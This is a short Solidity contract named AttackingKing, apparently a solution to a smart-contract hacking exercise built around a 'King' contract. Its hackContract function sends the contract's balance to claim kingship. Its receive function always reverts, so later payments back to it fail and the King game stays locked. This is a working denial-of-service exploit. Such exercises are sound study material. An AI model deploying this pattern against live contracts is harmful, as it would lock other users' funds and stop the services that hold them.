// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    King public king;

    constructor(address payable _king) payable {
        king = King(_king);
    }

    function hackContract() external {
        // Code me!
        address(king).call{value: address(this).balance}("");
    }

    receive() external payable {
        require(false, "lol nope");
    }
}
